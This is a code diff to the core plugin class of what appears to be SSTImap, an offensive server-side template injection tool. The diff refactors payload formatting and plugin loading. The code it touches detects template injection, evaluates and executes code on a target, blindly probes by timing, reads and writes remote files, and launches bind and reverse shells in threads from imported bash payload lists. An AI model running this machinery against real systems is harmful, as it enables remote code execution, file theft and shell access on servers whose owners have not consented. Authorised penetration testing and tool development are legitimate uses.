@@ -1,4 +1,5 @@
-from utils.strings import chunk_seq, md5
+from core import bash
+from utils.strings import chunk_seq, md5, formatters
 from utils import rand, config
 from utils.loggers import log
 from core.matcher import match
@@ -8,9 +9,22 @@ import base64
 import collections
 import threading
 import sys
+import importlib
+import os
 
 loaded_plugins = {}
 failed_plugins = []
+
+
+def load_plugins():
+    importlib.invalidate_caches()
+    groups = os.scandir(f"{sys.path[0]}/plugins")
+    groups = filter(lambda x: x.is_dir(), groups)
+    for g in groups:
+        modules = os.scandir(f"{sys.path[0]}/plugins/{g.name}")
+        modules = filter(lambda x: (x.name.endswith(".py") and not x.name.startswith("_")), modules)
+        for m in modules:
+            importlib.import_module(f"plugins.{g.name}.{m.name[:-3]}")
 
 
 def unload_plugins():
@@ -41,18 +55,6 @@ def _recursive_update(d, u):
     return d
 
 
-def compatible_url_safe_base64_encode(code):
-    code_b64 = code.encode(encoding='UTF-8')
-    code_b64 = base64.urlsafe_b64encode(code_b64).decode(encoding='UTF-8')
-    return code_b64
-
-
-def compatible_base64_encode(code):
-    code_b64p = code.encode(encoding='UTF-8')
-    code_b64p = base64.b64encode(code_b64p).decode(encoding='UTF-8')
-    return code_b64p
-
-
 class Plugin(object):
     generic_plugin = False
     legacy_plugin = False
@@ -61,6 +63,7 @@ class Plugin(object):
     priority = 10
     header_type = 'cat'
     header_length = 10
+    formatter = "default"
     sstimap_version = config.version
     plugin_info = {
         "Description": """This plugin has no description.""",
@@ -87,6 +90,9 @@ class Plugin(object):
         # Declare object attributes
         self.actions = {}
         self.contexts = []
+        self.set("formatter", self.__class__.__dict__.get("formatter", "default"))
+        self.default_wrapper = 'SSTIMAP:code;' if self.get("formatter", "default") == "sstimap" else '{code}'
+        self.channel.default_wrapper = self.default_wrapper
         # Call user-defined inits
         self.language_init()
         self.init()
@@ -189,44 +195,55 @@ class Plugin(object):
         if self.check_call_sequence('reverse_shell'):
             self.set('reverse_shell', True)
 
-    def get_call_sequence(self, action):
+    def get_call_sequence(self, action, error=None, boolean=None, blind=None):
         res = [action]
         if action in ["render"]:
             res += ["inject"]
         elif action not in ["inject"]:
             payload = self.actions.get(action, {}).copy()
             action_base = action.split("_")[0]
-            if self.get('error', False) and f'{action_base}_error' in self.actions:
+            if error is None:
+                error = self.get('error', False)
+            if boolean is None:
+                boolean = self.get('boolean', False)
+            if blind is None:
+                blind = self.get('blind', False)
+            if error and f'{action_base}_error' in self.actions:
                 payload.update(self.actions.get(f'{action_base}_error', {}))
-            elif self.get('boolean', False) and f'{action_base}_boolean' in self.actions:
+            elif boolean and f'{action_base}_boolean' in self.actions:
                 payload.update(self.actions.get(f'{action_base}_boolean', {}))
-            elif self.get('blind', False) and f'{action_base}_blind' in self.actions:
+            elif blind and f'{action_base}_blind' in self.actions:
                 payload.update(self.actions.get(f'{action_base}_blind', {}))
             elif action == 'blind' and self.get('boolean', False) and f'boolean' in self.actions:
                 payload.update(self.actions.get(f'boolean', {}))
             default = 'render' if action in ['execute', 'evaluate', 'read', 'md5'] else 'inject'
             call_name = payload.get('call', default)
-            res += self.get_call_sequence(call_name)
+            res += self.get_call_sequence(call_name, error, boolean, blind)
         return res
 
-    def check_call_sequence(self, action):
+    def check_call_sequence(self, action, error=None, boolean=None, blind=None):
         if action == "inject":
             return True
         action_base = action.split("_")[0]
         if action in ["evaluate", "execute", "evaluate_blind", "execute_blind"] and \
                 not (self.get(f"{action_base}_blind") or self.get(action_base)):
             return False
-        error = self.get('error', False)
-        boolean = self.get('boolean', False)
+        if error is None:
+            error = self.get('error', False)
+        if boolean is None:
+            boolean = self.get('boolean', False)
+        if blind is None:
+            blind = self.get('blind', False)
         if not (self.actions.get(action) or (error and self.actions.get(f'{action_base}_error')) or
                 (boolean and self.actions.get(f'{action_base}_boolean'))):
             return False
-        call = self.get_call_sequence(action)
+        call = self.get_call_sequence(action, error, boolean, blind)
         if len(call) > 1:
-            return self.check_call_sequence(call[1])
+            return self.check_call_sequence(call[1], error, boolean, blind)
         return True
 
     def detect(self):
+        formatter = formatters[self.get("formatter", "default")]
         # Get user-provided techniques
         techniques = self.channel.args.get('technique')
 
@@ -251,8 +268,8 @@ class Plugin(object):
                 else:
                     # If here, the rendering is confirmed
                     prefix = self.get('prefix', '')
-                    render = self.get('render', '{code}').format(code='*')
-                    wrapper = self.get('wrapper', '{code}').format(code=render)
+                    render = formatter(self.get('render', self.default_wrapper), {'code': '*'})
+                    wrapper = formatter(self.get('wrapper', self.default_wrapper), {'code': render})
                     suffix = self.get('suffix', '')
                     log.log(24, f'''{self.plugin} plugin has confirmed injection with tag '{repr(prefix).strip("'")}{repr(wrapper).strip("'")}{repr(suffix).strip("'")}' ''')
                     # Clean up any previous unreliable render data
@@ -314,6 +331,7 @@ class Plugin(object):
                     self.blind_detected()
 
     def _generate_contexts(self):
+        formatter = formatters[self.get("formatter", "default")]
         # Loop all the contexts
         for ctx in self.contexts:
             # If --force-level skip any other level
@@ -326,10 +344,10 @@ class Plugin(object):
             # The suffix is fixed
             # If the context has no closures, generate one closure with a zero-length string
             suffix = ctx.get('suffix', '')
-            suffix_format = "{closure}" in suffix or "{rclosure}" in suffix
-            suffix_text = (suffix.format(closure='', rclosure='') if suffix_format else suffix).replace('\n', '\\n')
-            prefix_text = ctx.get('prefix', '').format(closure='').replace('\n', '\\n')
-            wrappers = ctx.get('wrappers', ['{code}'])
+            suffix_format = self.get("formatter", "default") == "sstimap" or "{closure}" in suffix or "{rclosure}" in suffix
+            suffix_text = (formatter(suffix, {'closure': '', 'rclosure': ''}) if suffix_format else suffix).replace('\n', '\\n')
+            prefix_text = formatter(ctx.get('prefix', ''), {'closure': ''}).replace('\n', '\\n')
+            wrappers = ctx.get('wrappers', [self.default_wrapper])
             if ctx.get('closures'):
                 closures = self._generate_closures(ctx)
             else:
@@ -339,9 +357,9 @@ class Plugin(object):
             for wrapper in wrappers:
                 for closure, rclosure in closures:
                     # Format the prefix with closure
-                    prefix = ctx.get('prefix', '{closure}').format(closure=closure)
+                    prefix = formatter(ctx.get('prefix', '{closure}'), {'closure': closure})
                     if suffix_format:
-                        suffix = ctx.get('suffix', '').format(closure=closure, rclosure=rclosure)
+                        suffix = formatter(ctx.get('suffix', ''), {'closure': closure, 'rclosure': rclosure})
                     yield prefix, suffix, wrapper
 
     """
@@ -366,8 +384,9 @@ class Plugin(object):
             # Print if the first found unreliable render
             if not self.get(f'unreliable_{reflection}'):
                 if reflection == "render":
+                    formatter = formatters[self.get("formatter", "default")]
                     log.log(25, f"{self.plugin} plugin has detected unreliable rendering with tag "
-                                f"{repr(render_action.get('render').format(code='*'))}, skipping")
+                                f"{repr(formatter(render_action.get('render'), {'code': '*'}))}, skipping")
                 elif reflection == "render_error":
                     log.log(25, f"{self.plugin} plugin has detected unreliable error message, skipping")
             self.set(f'unreliable_{reflection}', render_action.get('render'))
@@ -383,7 +402,8 @@ class Plugin(object):
         payload_false = action.get('test_bool_false')
         call_name = action.get('call', 'inject')
         # Skip if something is missing or call function is not set
-        if self.no_tests or not (action and payload_true and payload_false and call_name and hasattr(self, call_name)):
+        if not (action and payload_true and payload_false and call_name and hasattr(self, call_name) and
+                self.check_call_sequence(variant, boolean=(variant == "boolean"))):
             return
         # Print what it's going to be tested
         log.log(23, f'{self.plugin} plugin is testing '
@@ -435,12 +455,14 @@ class Plugin(object):
     """
     def _detect_render(self, reflection="render"):
         render_action = self.actions.get(reflection)
-        if self.no_tests or not render_action:
+        if not (render_action and
+                self.check_call_sequence(reflection, error=(reflection == "render_error"))):
             return
         # Print what it's going to be tested
         if reflection == "render":
+            formatter = formatters[self.get("formatter", "default")]
             log.log(23, f"{self.plugin} plugin is testing rendering with tag "
-                        f"{repr(render_action.get('render').format(code='*' ))}")
+                        f"{repr(formatter(render_action.get('render'), {'code': '*'}))}")
         elif reflection == "render_error":
             log.log(23, f'{self.plugin} plugin is testing error-based injection')
         for prefix, suffix, wrapper in self._generate_contexts():
@@ -449,9 +471,9 @@ class Plugin(object):
             payload = render_action.get('test_render')
             wrapper_type = render_action.get(f'wrapper_type', 'local')
             header_rand = [rand.randint_n(self.header_length, 4), rand.randint_n(self.header_length, 4)]
-            header = render_action.get('header')  # .format(header=header_rand)
+            header = render_action.get('header')
             trailer_rand = [rand.randint_n(self.header_length, 4), rand.randint_n(self.header_length, 4)]
-            trailer = render_action.get('trailer')  # .format(trailer=trailer_rand)
+            trailer = render_action.get('trailer')
             # First probe with payload wrapped by header and trailer, no suffix or prefix
             if expected == self.render(code=payload, header=header, trailer=trailer, header_rand=header_rand,
                                        trailer_rand=trailer_rand, prefix=prefix, suffix=suffix, wrapper=wrapper,
@@ -473,10 +495,10 @@ class Plugin(object):
     def inject(self, code, **kwargs):
         prefix = kwargs.get('prefix', self.get('prefix', ''))
         suffix = kwargs.get('suffix', self.get('suffix', ''))
-        wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
+        wrapper = kwargs.get('wrapper', self.get('wrapper', self.default_wrapper))
         blind = kwargs.get('blind', self.get('blind', False))
         boolean = kwargs.get('boolean', self.get('boolean', False))
-        injection = prefix + wrapper.format(code=code) + suffix
+        injection = prefix + formatters[self.get("formatter", "default")](wrapper, {'code': code}) + suffix
         log.debug(f'[request {self.plugin}] {repr(self.channel.url)}')
         # If the request is blind
         if blind:
@@ -535,6 +557,7 @@ class Plugin(object):
         
     """
     def render(self, code, **kwargs):
+        formatter = formatters[self.get("formatter", "default")]
         error = kwargs.get('error', self.get('error', False))
         call_name = 'render_error' if error else 'render'
         # If header == '', do not send headers
@@ -547,7 +570,7 @@ class Plugin(object):
             if header_template:
                 header_rand = kwargs.get('header_rand', self.get('header_rand', [rand.randint_n(self.header_length,4),
                                                                                  rand.randint_n(self.header_length,4)]))
-                header = header_template.format(header=header_rand)
+                header = formatter(header_template, {'header': header_rand})
         else:
             header_rand = [0, 0]
             header = ''
@@ -560,7 +583,7 @@ class Plugin(object):
             if trailer_template:
                 trailer_rand = kwargs.get('trailer_rand', self.get('trailer_rand', [rand.randint_n(self.header_length,4),
                                                                                     rand.randint_n(self.header_length,4)]))
-                trailer = trailer_template.format(trailer=trailer_rand)
+                trailer = formatter(trailer_template, {'trailer': trailer_rand})
         else:
             trailer_rand = [0, 0]
             trailer = ''
@@ -571,17 +594,19 @@ class Plugin(object):
         if not payload_template:
             # Exiting, actions.render(_error).render is not set
             return
-        payload = payload_template.format(code=code)
+        payload = formatter(payload_template, {'code': code})
         prefix = kwargs.get('prefix', self.get('prefix', ''))
         suffix = kwargs.get('suffix', self.get('suffix', ''))
-        wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
+        wrapper = kwargs.get('wrapper', self.get('wrapper', self.default_wrapper))
         wrapper_type = kwargs.get('wrapper_type', self.get('wrapper_type', 'local'))
         blind = kwargs.get('blind', False)
         boolean = kwargs.get('boolean', False)
         if wrapper_type == "local":
-            injection = wrapper.format(code=header) + wrapper.format(code=payload) + wrapper.format(code=trailer)
+            injection = formatter(wrapper, {'code': header}) + \
+                        formatter(wrapper, {'code': payload}) + \
+                        formatter(wrapper, {'code': trailer})
         elif wrapper_type == "global":
-            injection = wrapper.format(code=header+payload+trailer)
+            injection = formatter(wrapper, {'code': header + payload + trailer})
         else:  # Fallback if wrapper type is unknown
             injection = header + payload + trailer
         if header_type == "add":
@@ -597,7 +622,7 @@ class Plugin(object):
         # to better tone the blind request timeouts.
         # Reset wrapper to empty, as it was already applied
         result_raw = self.inject(code=injection, prefix=prefix, suffix=suffix,
-                                 blind=blind, boolean=boolean, wrapper="{code}")
+                                 blind=blind, boolean=boolean, wrapper=self.default_wrapper)
         if blind or boolean:
             return result_raw
         else:
@@ -657,7 +682,7 @@ class Plugin(object):
         # Skip if something is missing or call function is not set
         if not action or not payload or not call_name or not hasattr(self, call_name):
             return
-        execution_code = payload.format(path=remote_path)
+        execution_code = formatters[self.get("formatter", "default")](payload, {'path': remote_path})
         result = getattr(self, call_name)(code=execution_code)
         exfiltrate = action.get('exfiltrate', 'plain')
         if exfiltrate == 'base64':
@@ -695,7 +720,7 @@ class Plugin(object):
         if not md5_remote:
             log.log(25, 'Error getting remote file md5, check presence and permission')
             return
-        execution_code = payload.format(path=remote_path)
+        execution_code = formatters[self.get("formatter", "default")](payload, {'path': remote_path})
         data_b64encoded = getattr(self, call_name)(code=execution_code)
         data = base64.b64decode(data_b64encoded)
         if not md5(data) == md5_remote:
@@ -705,6 +730,7 @@ class Plugin(object):
         return data
 
     def write(self, data, remote_path):
+        formatter = formatters[self.get("formatter", "default")]
         action = self.actions.get('write', {})
         payload_write = action.get('write')
         payload_truncate = action.get('truncate')
@@ -721,20 +747,12 @@ class Plugin(object):
                     log.log(25, 'Remote file already exists, run with --force-overwrite to overwrite')
                 return
             else:
-                execution_code = payload_truncate.format(path=remote_path)
+                execution_code = formatter(payload_truncate, {'path': remote_path})
                 getattr(self, call_name)(code=execution_code)
         # Upload file in chunks of 500 characters
         for chunk in chunk_seq(data, 500):
             log.debug(f'[b64 encoding] {chunk}')
-            chunk_b64 = base64.urlsafe_b64encode(chunk)
-            chunk_b64p = base64.b64encode(chunk)
-            lens = {
-                'path': len(remote_path),
-                'clen': len(chunk),
-                'clen64': len(chunk_b64),
-                'clen64p': len(chunk_b64p)
-            }
-            execution_code = payload_write.format(path=remote_path, chunk_b64=chunk_b64, chunk_b64p=chunk_b64p, lens=lens)
+            execution_code = formatter(payload_write, {'path': remote_path, 'chunk': chunk})
             getattr(self, call_name)(code=execution_code)
         if self.get('blind') or self.get('boolean'):
             log.log(25, 'Blind upload can\'t check the upload correctness, check manually')
@@ -746,7 +764,7 @@ class Plugin(object):
     def evaluate(self, code,  **kwargs):
         prefix = kwargs.get('prefix', self.get('prefix', ''))
         suffix = kwargs.get('suffix', self.get('suffix', ''))
-        wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
+        wrapper = kwargs.get('wrapper', self.get('wrapper', self.default_wrapper))
         blind = kwargs.get('blind', False)
         error = kwargs.get('error', self.get('error', False))
         boolean = kwargs.get('boolean', self.get('boolean', False))
@@ -758,18 +776,7 @@ class Plugin(object):
         # Skip if something is missing or call function is not set
         if not action or not payload or not call_name or not hasattr(self, call_name):
             return
-        if '{code_b64}' in payload:
-            log.debug(f'[b64u encoding] {code}')
-        if '{code_b64p}' in payload:
-            log.debug(f'[b64 encoding] {code}')
-        code_b64 = compatible_url_safe_base64_encode(code)
-        code_b64p = compatible_base64_encode(code)
-        lens = {
-            'clen': len(code),
-            'clen64': len(code_b64),
-            'clen64p': len(code_b64p)
-        }
-        execution_code = payload.format(code_b64=code_b64, code=code, code_b64p=code_b64p, lens=lens)
+        execution_code = formatters[self.get("formatter", "default")](payload, {"code": code})
         result = getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix,
                                           wrapper=wrapper, blind=blind, boolean=boolean)
         if type(result) == str:
@@ -784,7 +791,7 @@ class Plugin(object):
     def execute(self, code, **kwargs):
         prefix = kwargs.get('prefix', self.get('prefix', ''))
         suffix = kwargs.get('suffix', self.get('suffix', ''))
-        wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
+        wrapper = kwargs.get('wrapper', self.get('wrapper', self.default_wrapper))
         blind = kwargs.get('blind', False)
         error = kwargs.get('error', self.get('error', False))
         boolean = kwargs.get('boolean', self.get('boolean', False))
@@ -798,18 +805,7 @@ class Plugin(object):
         # Skip if something is missing or call function is not set
         if not action or not payload or not call_name or not hasattr(self, call_name):
             return
-        if '{code_b64}' in payload:
-            log.debug(f'[b64u encoding] {code}')
-        if '{code_b64p}' in payload:
-            log.debug(f'[b64 encoding] {code}')
-        code_b64 = compatible_url_safe_base64_encode(code)
-        code_b64p = compatible_base64_encode(code)
-        lens = {
-            'clen': len(code),
-            'clen64': len(code_b64),
-            'clen64p': len(code_b64p)
-        }
-        execution_code = payload.format(code_b64=code_b64, code_b64p=code_b64p, code=code, lens=lens)
+        execution_code = formatters[self.get("formatter", "default")](payload, {"code": code})
         result = getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix,
                                           wrapper=wrapper, blind=blind, boolean=boolean)
         if type(result) == str:
@@ -825,7 +821,7 @@ class Plugin(object):
     def evaluate_blind(self, code, **kwargs):
         prefix = kwargs.get('prefix', self.get('prefix', ''))
         suffix = kwargs.get('suffix', self.get('suffix', ''))
-        wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
+        wrapper = kwargs.get('wrapper', self.get('wrapper', self.default_wrapper))
         blind = kwargs.get('blind', self.get('blind', False))
         boolean = kwargs.get('boolean', self.get('boolean', False))
         action = self.actions.get('evaluate_blind', {})
@@ -836,28 +832,15 @@ class Plugin(object):
         # Skip if something is missing or call function is not set
         if not action or not payload_action or not call_name or not hasattr(self, call_name):
             return
-        expected_delay = self._get_expected_delay()
-        if '{code_b64}' in payload_action:
-            log.debug(f'[b64u encoding] {code}')
-        if '{code_b64p}' in payload_action:
-            log.debug(f'[b64 encoding] {code}')
-        code_b64 = compatible_url_safe_base64_encode(code)
-        code_b64p = compatible_base64_encode(code)
-        lens = {
-            'clen': len(code),
-            'clen64': len(code_b64),
-            'clen64p': len(code_b64p),
-            'delay': len(str(expected_delay))
-        }
-        execution_code = payload_action.format(code_b64=code_b64, lens=lens,
-                                               code_b64p=code_b64p, code=code, delay=expected_delay)
+        data = {"code": code, "delay": self._get_expected_delay()}
+        execution_code = formatters[self.get("formatter", "default")](payload_action, data)
         return getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix,
                                         wrapper=wrapper, blind=blind, boolean=boolean)
 
     def execute_blind(self, code, **kwargs):
         prefix = kwargs.get('prefix', self.get('prefix', ''))
         suffix = kwargs.get('suffix', self.get('suffix', ''))
-        wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
+        wrapper = kwargs.get('wrapper', self.get('wrapper', self.default_wrapper))
         blind = kwargs.get('blind', self.get('blind', False))
         boolean = kwargs.get('boolean', self.get('boolean', False))
         action = self.actions.get('execute_blind', {})
@@ -868,21 +851,8 @@ class Plugin(object):
         # Skip if something is missing or call function is not set
         if not action or not payload_action or not call_name or not hasattr(self, call_name):
             return
-        expected_delay = self._get_expected_delay()
-        if '{code_b64}' in payload_action:
-            log.debug(f'[b64u encoding] {code}')
-        if '{code_b64p}' in payload_action:
-            log.debug(f'[b64 encoding] {code}')
-        code_b64 = compatible_url_safe_base64_encode(code)
-        code_b64p = compatible_base64_encode(code)
-        lens = {
-            'clen': len(code),
-            'clen64': len(code_b64),
-            'clen64p': len(code_b64p),
-            'delay': len(str(expected_delay))
-        }
-        execution_code = payload_action.format(code_b64=code_b64, lens=lens,
-                                               code_b64p=code_b64p, code=code, delay=expected_delay)
+        data = {"code": code, "delay": self._get_expected_delay()}
+        execution_code = formatters[self.get("formatter", "default")](payload_action, data)
         return getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix,
                                         wrapper=wrapper, blind=blind, boolean=boolean)
 
@@ -900,26 +870,32 @@ class Plugin(object):
 
     def bind_shell(self, port, shell="/bin/sh"):
         action = self.actions.get('bind_shell', {})
-        payload_actions = action.get('bind_shell')
+        formatter = self.get("formatter", "default")
+        # Old plugins might import payloads directly, new plugins can define their own payloads on the template level
+        payload_actions = action.get('bind_shell', bash.bind_shell)
+        if payload_actions is bash.bind_shell:
+            formatter = "sstimap"
         call_name = action.get('call', 'inject')
-        # Skip if something is missing or call function is not set
         if not action or not isinstance(payload_actions, list) or not call_name or not hasattr(self, call_name):
             return
         for payload_action in payload_actions:
-            execution_code = payload_action.format(port=port, shell=shell)
+            execution_code = formatters[formatter](payload_action, {"port": port, "shell": shell})
             reqthread = threading.Thread(target=getattr(self, call_name), args=(execution_code,))
             reqthread.start()
             yield reqthread
 
     def reverse_shell(self, host, port, shell="/bin/sh"):
         action = self.actions.get('reverse_shell', {})
-        payload_actions = action.get('reverse_shell')
+        formatter = self.get("formatter", "default")
+        # Old plugins might import payloads directly, new plugins can define their own payloads on the template level
+        payload_actions = action.get('reverse_shell', bash.reverse_shell)
+        if payload_actions is bash.reverse_shell:
+            formatter = "sstimap"
         call_name = action.get('call', 'inject')
-        # Skip if something is missing or call function is not set
         if not action or not isinstance(payload_actions, list) or not call_name or not hasattr(self, call_name):
             return
         for payload_action in payload_actions:
-            execution_code = payload_action.format(port=port, shell=shell, host=host)
+            execution_code = formatters[formatter](payload_action, {"port": port, "shell": shell, "host": host})
             reqthread = threading.Thread(target=getattr(self, call_name), args=(execution_code,))
             reqthread.start()
 
